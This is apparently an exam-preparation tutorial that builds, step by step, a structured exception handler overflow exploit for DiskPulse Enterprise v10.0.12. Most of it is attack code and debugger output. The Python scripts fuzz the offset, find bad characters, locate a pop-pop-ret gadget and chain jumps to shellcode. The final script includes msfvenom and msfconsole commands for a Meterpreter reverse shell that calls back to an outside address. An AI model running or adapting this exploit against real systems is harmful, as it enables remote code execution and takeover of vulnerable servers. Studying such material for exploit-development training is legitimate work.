---
description: Structured Exception Handling Overflow (EXP-301 Edit)
---

# OSED SEH Overflow

- [https://jasonturley.xyz/windows-exploit-development-part-2-structured-exception-handler-seh-overflow/](https://jasonturley.xyz/windows-exploit-development-part-2-structured-exception-handler-seh-overflow/)
- [https://github.com/stephenbradshaw/vulnserver](https://github.com/stephenbradshaw/vulnserver)

All you need to know about the SEH Overflow challenge for OSED exam preparation.

The example below was made when building an exploit for DiskPulse Enterprise v10.0.12. Other versions of this exploit are:

- [https://www.exploit-db.com/exploits/42778](https://www.exploit-db.com/exploits/42778)
- [https://github.com/snowcra5h/DiskPulse-Exploit](https://github.com/snowcra5h/DiskPulse-Exploit)




## 1. Determine Exception Handler Offset

Generate a unique pattern and feed it to the vulnerable application.

{% code title="sehof_send_pattern.py" %}
```python
#!/usr/bin/env python3

import socket

host = '127.0.0.1'
port = 80

# msf-pattern_create -l 6000
buf = b'<UNIQUE_PATTERN>'

request  = b'GET /' + buf + b'HTTP/1.1' + b'\r\n'
request += b'Host: ' + host.encode() + b'\r\n'
request += b'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:31.0) Gecko/20100101 Firefox/31.0 Iceweasel/31.8.0' + b'\r\n'
request += b'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' + b'\r\n'
request += b'Accept-Language: en-US,en;q=0.5' + b'\r\n'
request += b'Accept-Encoding: gzip, deflate' + b'\r\n'
request += b'Connection: keep-alive' + b'\r\n\r\n'

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
s.send(request)
s.close()
```
{% endcode %}

Inspect the crashed thread *ExceptionList* in WinDbg to find the overwritten value:

```
0:012> !teb
TEB at 00258000
    ExceptionList:        023aff54
0:012> dt _EXCEPTION_REGISTRATION_RECORD 023aff54
ntdll!_EXCEPTION_REGISTRATION_RECORD
   +0x000 Next             : 0x32664431 _EXCEPTION_REGISTRATION_RECORD
   +0x004 Handler          : 0x44336644     _EXCEPTION_DISPOSITION  +44336644

Or

0:012> !exchain
023aff54: 44336644
Invalid exception stack at 32664431
```

Calculate the offset from buffer to the target *_except_handler* overwrite:

```
$ msf-pattern_offset -l 6000 -q 44336644
[*] Exact match at offset 2499
```




## 2. Confirm SEH Overflow

Confirm that you can actually control the *Handler* value - if true, it will be overwritten with `d34dc0d3`.

{% code title="sehof_confirm.py" %}
```python
#!/usr/bin/env python3

import socket
import struct

def little_endian(num):
    return struct.pack('<I', num)

host = '127.0.0.1'
port = 80
size = 6000

filler  = b'A' * 2499
handler = little_endian(0xd34dc0d3)
junk    = b'C' * (size - len(filler + handler))

buf = filler + handler + junk

request  = b'GET /' + buf + b'HTTP/1.1' + b'\r\n'
request += b'Host: ' + host.encode() + b'\r\n'
request += b'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:31.0) Gecko/20100101 Firefox/31.0 Iceweasel/31.8.0' + b'\r\n'
request += b'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' + b'\r\n'
request += b'Accept-Language: en-US,en;q=0.5' + b'\r\n'
request += b'Accept-Encoding: gzip, deflate' + b'\r\n'
request += b'Connection: keep-alive' + b'\r\n\r\n'

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
s.send(request)
s.close()
```
{% endcode %}




## 3. Enumerate the Bad Characters

Determine the bad characters set which when included causes unwanted behavior.

{% code title="sehof_bad_chars.py" %}
```python
#!/usr/bin/env python3

import socket
import struct

def little_endian(num):
    return struct.pack('<I', num)

host = '127.0.0.1'
port = 80
size = 6000

badchars = (
    b'\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10'
    b'\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20'
    b'\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30'
    b'\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40'
    b'\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50'
    b'\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60'
    b'\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70'
    b'\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80'
    b'\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90'
    b'\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0'
    b'\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0'
    b'\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0'
    b'\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0'
    b'\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0'
    b'\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0'
    b'\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff'
)
filler  = b'A' * 2499
handler = little_endian(0xd34dc0d3)
junk    = b'C' * (size - len(filler + handler + badchars))

buf = filler + handler + badchars + junk

request  = b'GET /' + buf + b'HTTP/1.1' + b'\r\n'
request += b'Host: ' + host.encode() + b'\r\n'
request += b'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:31.0) Gecko/20100101 Firefox/31.0 Iceweasel/31.8.0' + b'\r\n'
request += b'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' + b'\r\n'
request += b'Accept-Language: en-US,en;q=0.5' + b'\r\n'
request += b'Accept-Encoding: gzip, deflate' + b'\r\n'
request += b'Connection: keep-alive' + b'\r\n\r\n'

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
s.send(request)
s.close()
```
{% endcode %}

In case the bad characters cause the SEH overflow not happen at all, this command can help to speed up the debug routine:

```
PS > Restart-Service "Vuln Service"; .\DbgX.Shell.exe -pn vulnsvc.exe -c 'g; !exchain'; sleep 3; python C:\sehof_bad_chars.py
```

In case the bad characters are truncated from memory, dump the bytes (*EstablisherFrame* - the second argument of the vulnerable *ExecuteHandler*) and examine them manually or use [find-bad-chars.py](https://github.com/epi052/osed-scripts/blob/main/find-bad-chars.py) by [@epi052](https://twitter.com/epi052):

```
0:012> g; dds esp L3
01c7b8f8  77e06f82 ntdll!ExecuteHandler2+0x26
01c7b8fc  01c7ba00
01c7b900  01c7ff54
0:012> db 01c7ff54+8 L100

Or

0:012> .load pykd
0:012> !py C:\OSED\find-bad-chars.py -a 01c7ff54
```




## 4. Search for P/P/R Sequence

P/P/R == `pop R32, pop R32, ret`:

```
$ msf-nasm_shell
nasm > pop eax
00000000 58 pop eax
nasm > pop ebx
00000000 5B pop ebx
nasm > pop ecx
00000000 59 pop ecx
nasm > pop edx
00000000 5A pop edx
nasm > pop esi
00000000 5E pop esi
nasm > pop edi
00000000 5F pop edi
nasm > pop ebp
00000000 5D pop ebp
nasm > ret
00000000 C3 ret
```

Locate a module with `/SafeSEH OFF` using [narly](https://code.google.com/archive/p/narly/):

```
0:012> load .narly
0:012> !nmod
10000000 10221000 libspp               /SafeSEH OFF                C:\Program Files\Vuln Software\bin\libspp.dll
```



### WinDbg Classic Script

{% code title="find_ppr.wds" %}
```
.block
{
    .for (r $t0 = 0x58; $t0 < 0x5F; r $t0 = $t0 + 0x01)
    {
        .for (r $t1 = 0x58; $t1 < 0x5F; r $t1 = $t1 + 0x01)
        {
            s-[1]b 10000000 10221000 $t0 $t1 c3
        }
    }
}
```
{% endcode %}

Search with a WinDbg Classic Script:

```
0:012> $><C:\find-ppr.wds
0x101576c0
...
0:012> u 101576c0 L3
libspp!pcre_exec+0x16450:
101576c0 58              pop     eax
101576c1 5b              pop     ebx
101576c2 c3              ret
```



### PyKD

- [https://hshrzd.wordpress.com/2022/01/06/python-scripting-for-windbg-a-quick-introduction-to-pykd/](https://hshrzd.wordpress.com/2022/01/06/python-scripting-for-windbg-a-quick-introduction-to-pykd/)
- [https://jasonturley.xyz/install-pykd-in-windbg/](https://jasonturley.xyz/install-pykd-in-windbg/)
- [https://github.com/uf0o/PyKD](https://github.com/uf0o/PyKD)

Search with [find-ppr.py](https://github.com/epi052/osed-scripts/blob/main/find-ppr.py) by [@epi052](https://twitter.com/epi052):

```
0:012> .load pykd.dll
0:012> !py C:\OSED\find-ppr.py -m libspp -b 00
[+] searching libspp for pop r32; pop r32; ret
[+] BADCHARS: \x00
[OK] libspp::0x101576c0: pop eax; pop ebx; ret ; \xC0\x76\x15\x10
...
```

Update your script with the discovered value.

{% code title="sehof_ppr.py" %}
```python
#!/usr/bin/env python3

import socket
import struct

def little_endian(num):
    return struct.pack('<I', num)

host = '127.0.0.1'
port = 80
size = 6000

exp  = b''
exp += little_endian(0x101576c0)  # (PPR) pop eax; pop ebx; ret

filler = b'A' * 2499
junk   = b'C' * (size - len(filler + exp))

buf = filler + exp + junk

request  = b'GET /' + buf + b'HTTP/1.1' + b'\r\n'
request += b'Host: ' + host.encode() + b'\r\n'
request += b'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:31.0) Gecko/20100101 Firefox/31.0 Iceweasel/31.8.0' + b'\r\n'
request += b'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' + b'\r\n'
request += b'Accept-Language: en-US,en;q=0.5' + b'\r\n'
request += b'Accept-Encoding: gzip, deflate' + b'\r\n'
request += b'Connection: keep-alive' + b'\r\n\r\n'

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
s.send(request)
s.close()
```
{% endcode %}




## 5. Short Jump over NSEH

Break on the P/P/R and assemble a short jump over the *Next* structure exception handler:

```
PS > Restart-Service "Vuln Service"; .\DbgX.Shell.exe -pn vulnsvc.exe -c 'g; bp 0x101576c0; g'; sleep 2; python C:\sehof_ppr.py

Breakpoint 0 hit
eax=00000000 ebx=00000000 ecx=101576c0 edx=77e06fa0 esi=00000000 edi=00000000
eip=101576c0 esp=01c4b8f8 ebp=01c4b918 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
libspp!pcre_exec+0x16450:
101576c0 58              pop     eax
0:012> t
eax=77e06f82 ebx=00000000 ecx=101576c0 edx=77e06fa0 esi=00000000 edi=00000000
eip=101576c1 esp=01c4b8fc ebp=01c4b918 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
libspp!pcre_exec+0x16451:
101576c1 5b              pop     ebx
0:012> t
eax=77e06f82 ebx=01c4ba00 ecx=101576c0 edx=77e06fa0 esi=00000000 edi=00000000
eip=101576c2 esp=01c4b900 ebp=01c4b918 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
libspp!pcre_exec+0x16452:
101576c2 c3              ret
0:012> t
eax=77e06f82 ebx=01c4ba00 ecx=101576c0 edx=77e06fa0 esi=00000000 edi=00000000
eip=01c4ff54 esp=01c4b904 ebp=01c4b918 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
01c4ff54 41              inc     ecx
0:012> dds eip L4
01c4ff54  41414141
01c4ff58  101576c0 libspp!pcre_exec+0x16450
01c4ff5c  43434343
01c4ff60  43434343
0:012> a
01c4ff54 jmp 0x01c4ff5c
01c4ff56 
0:012> u eip L1
01c4ff54 eb06            jmp     01c4ff5c
```

Update your script with the disassembled jump value.

{% code title="sehof_nseh.py" %}
```python
#!/usr/bin/env python3

import socket
import struct

def little_endian(num):
    return struct.pack('<I', num)

host = '127.0.0.1'
port = 80
size = 6000

exp  = little_endian(0x06eb9090)  # (NSEH) jmp +06
exp += little_endian(0x101576c0)  # (PPR)  pop eax; pop ebx; ret
#exp += b'\x90\x90'                # (NSEH) offset for the 'eb 06' part of the jmp instruction

filler = b'A' * (2499 - 4)
junk   = b'C' * (size - len(filler + exp))

buf = filler + exp + junk

request  = b'GET /' + buf + b'HTTP/1.1' + b'\r\n'
request += b'Host: ' + host.encode() + b'\r\n'
request += b'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:31.0) Gecko/20100101 Firefox/31.0 Iceweasel/31.8.0' + b'\r\n'
request += b'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' + b'\r\n'
request += b'Accept-Language: en-US,en;q=0.5' + b'\r\n'
request += b'Accept-Encoding: gzip, deflate' + b'\r\n'
request += b'Connection: keep-alive' + b'\r\n\r\n'

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
s.send(request)
s.close()
```
{% endcode %}

Examine the memory before executing the jump to make sure we'll land in the desired buffer:

```
0:012> t
eax=77e06f82 ebx=01c4ba00 ecx=101576c0 edx=77e06fa0 esi=00000000 edi=00000000
eip=01c4ff56 esp=01c4b904 ebp=01c4b918 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
01c4ff56 eb06            jmp     01c4ff5e
0:012> dd 01c4ff5e - 0x06
01c4ff58  101576c0 43434343 43434343 43434343
01c4ff68  43434343 43434343 43434343 43434343
01c4ff78  43434343 43434343 43434343 43434343
01c4ff88  43434343 43434343 43434343 43434343
01c4ff98  43434343 43434343 43434343 43434343
01c4ffa8  43434343 43434343 43434343 43434343
01c4ffb8  43434343 43434343 43434343 43434343
01c4ffc8  43434343 43434343 43434343 43434343
```




## 6. Find a Region for the Shellcode

Add a shellcode stub to the script and break after the short jump over NSEH.

{% code title="sehof_shellcode_region.py" %}
```python
#!/usr/bin/env python3

import socket
import struct

def little_endian(num):
    return struct.pack('<I', num)

host = '127.0.0.1'
port = 80
size = 6000
shellcode_size = 600

shellcode  = little_endian(0xd34dc0d3)
shellcode += b'C' * (shellcode_size - len(shellcode))

exp  = little_endian(0x06eb9090)  # (NSEH) jmp +06
exp += little_endian(0x101576c0)  # (PPR) pop eax; pop ebx; ret
exp += b'\x90\x90'                # (NSEH) offset for the 'eb 06' part of the jmp instruction

filler = b'A' * (2499 - 4)
nop    = b'\x90' * (size - len(filler + exp + shellcode))

buf = filler + exp + shellcode + nop
print(f'buf({len(buf)}): filler({len(filler)}) -> exp({len(exp)}) -> shellcode({len(shellcode)}) -> nop({len(nop)})')

request  = b'GET /' + buf + b'HTTP/1.1' + b'\r\n'
request += b'Host: ' + host.encode() + b'\r\n'
request += b'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:31.0) Gecko/20100101 Firefox/31.0 Iceweasel/31.8.0' + b'\r\n'
request += b'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' + b'\r\n'
request += b'Accept-Language: en-US,en;q=0.5' + b'\r\n'
request += b'Accept-Encoding: gzip, deflate' + b'\r\n'
request += b'Connection: keep-alive' + b'\r\n\r\n'

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
s.send(request)
s.close()
```
{% endcode %}

Search the stack memory to find the shellcode stub start address:

```
0:012> dd eip L1
01caff5e  d34dc0d3
0:012> !teb
TEB at 002d2000
    ExceptionList:        01cab90c
    StackBase:            01cb0000
    StackLimit:           01caa000
0:012> s -b 01caa000 01cb0000 d3 c0 4d d3 43 43 43 43 43 43 43 43
01cac856  d3 c0 4d d3 43 43 43 43-43 43 43 43 43 43 43 43  ..M.CCCCCCCCCCCC
01cadaae  d3 c0 4d d3 43 43 43 43-43 43 43 43 43 43 43 43  ..M.CCCCCCCCCCCC
01caed06  d3 c0 4d d3 43 43 43 43-43 43 43 43 43 43 43 43  ..M.CCCCCCCCCCCC
01caff5e  d3 c0 4d d3 43 43 43 43-43 43 43 43 43 43 43 43  ..M.CCCCCCCCCCCC
0:012> dd 01cac856 L96
01cac856  d34dc0d3 43434343 43434343 43434343
...       ...      ...      ...      ...
01cacaa6  43434343 43434343
0:012> ? 01cac856 - @esp
Evaluate expression: 3922 = 00000f52
```




## 7. Island Hop

As one of the options of moving EIP into the shellcode, align the stack (ESP) with the corresponding offset from (6):

```
$ msf-nasm_shell
nasm > add esp, 0xf52
00000000  81C4520F0000      add esp,0xf52  // Contains bad zero bytes
nasm > add sp, 0xf52
00000000  6681C4520F        add sp,0xf52
nasm > jmp esp
00000000  FFE4              jmp esp
```

Update your script with the disassembled align & jump instructions.

{% code title="sehof_island_hop.py" %}
```python
#!/usr/bin/env python3

import socket
import struct

def little_endian(num):
    return struct.pack('<I', num)

host = '127.0.0.1'
port = 80
size = 6000
shellcode_size = 600

shellcode  = little_endian(0xd34dc0d3)
shellcode += b'C' * (shellcode_size - len(shellcode))

exp  = little_endian(0x06eb9090)  # (NSEH) jmp +06
exp += little_endian(0x101576c0)  # (PPR) pop eax; pop ebx; ret
exp += b'\x90\x90'                # (NSEH) offset for the 'eb 06' part of the jmp instruction
exp += b'\x66\x81\xc4\x52\x0f'    # (Island Hop) add sp, 0xf50
exp += b'\xff\xe4'                # (Island Hop) jmp esp

filler = b'A' * (2499 - 4)
nop    = b'\x90' * (size - len(filler + exp + shellcode))

buf = filler + exp + shellcode + nop
print(f'buf({len(buf)}): filler({len(filler)}) -> exp({len(exp)}) -> shellcode({len(shellcode)}) -> nop({len(nop)})')

request  = b'GET /' + buf + b'HTTP/1.1' + b'\r\n'
request += b'Host: ' + host.encode() + b'\r\n'
request += b'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:31.0) Gecko/20100101 Firefox/31.0 Iceweasel/31.8.0' + b'\r\n'
request += b'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' + b'\r\n'
request += b'Accept-Language: en-US,en;q=0.5' + b'\r\n'
request += b'Accept-Encoding: gzip, deflate' + b'\r\n'
request += b'Connection: keep-alive' + b'\r\n\r\n'

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
s.send(request)
s.close()
```
{% endcode %}

Break on the alignment jump and make sure the target buffer is the shellcode stub:

```
0:012> t
eax=771f6f82 ebx=01d6ba00 ecx=101576c0 edx=771f6fa0 esi=00000000 edi=00000000
eip=01d6ff5e esp=01d6b904 ebp=01d6b918 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
01d6ff5e 6681c4520f      add     sp,0F52h
0:012> t
eax=771f6f82 ebx=01d6ba00 ecx=101576c0 edx=771f6fa0 esi=00000000 edi=00000000
eip=01d6ff63 esp=01d6c856 ebp=01d6b918 iopl=0         nv up ei ng nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000286
01d6ff63 ffe4            jmp     esp {01d6c856}
0:012> dd @esp L4
01d3c856  d34dc0d3 43434343 43434343 43434343
```

However, if the island hop is too close to the shellcode on stack, we may see the hop itself when aligning the stack which is unwanted:

```
0:012> u @esp L5
01d6c856 6681c4520f      add     sp,0F52h
01d6c85b ffe4            jmp     esp
01d6c85d d3c0            rol     eax,cl
01d6c85f 4d              dec     ebp
```

In this case, we can calculate the raw offset between the shellcode on stack and current EIP:

```
0:012> ? 01c6c85a - @eip
Evaluate expression: -14084 = ffffc8fc
```

And then assemble an appropriate jump:

```
jmp 0xffffc8fc
0:  e9 f8 c8 ff ff          jmp    ffffc8fd <_main+0xffffc8fd>
```




## 8. Exploit!

{% code title="sehof_exploit.py" %}
```python
#!/usr/bin/env python3

import socket
import struct

def little_endian(num):
    return struct.pack('<I', num)

host = '127.0.0.1'
port = 80
size = 6000
shellcode_size = 600

shellcode  = b'\x90' * 20
# msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.13.37 LPORT=1337 EXITFUNC=thread -b "\x00\x09\x0a\x0d\x20" -e x86/shikata_ga_nai -f python -v shellcode
# sudo msfconsole -qx 'use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST eth0; set LPORT 1337; set EXITFUNC thread; run'
shellcode += b"<SHELLCODE>"
shellcode += b'C' * (shellcode_size - len(shellcode))

exp  = little_endian(0x06eb9090)  # (NSEH) jmp +06
exp += little_endian(0x101576c0)  # (PPR) pop eax; pop ebx; ret
exp += b'\x90\x90'                # (NSEH) offset for the 'eb 06' part of the jmp instruction
#exp += b'\x66\x81\xc4\x52\x0f'    # (Island Hop) add sp, 0xf50
#exp += b'\xff\xe4'                # (Island Hop) jmp esp
exp += b'\xe9\xf8\xc8\xff\xff'

filler = b'A' * (2499 - 4)
nop    = b'\x90' * (size - len(filler + exp + shellcode))

buf = filler + exp + shellcode + nop
print(f'buf({len(buf)}): filler({len(filler)}) -> exp({len(exp)}) -> shellcode({len(shellcode)}) -> nop({len(nop)})')

request  = b'GET /' + buf + b'HTTP/1.1' + b'\r\n'
request += b'Host: ' + host.encode() + b'\r\n'
request += b'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:31.0) Gecko/20100101 Firefox/31.0 Iceweasel/31.8.0' + b'\r\n'
request += b'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' + b'\r\n'
request += b'Accept-Language: en-US,en;q=0.5' + b'\r\n'
request += b'Accept-Encoding: gzip, deflate' + b'\r\n'
request += b'Connection: keep-alive' + b'\r\n\r\n'

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
s.send(request)
s.close()
```
{% endcode %}
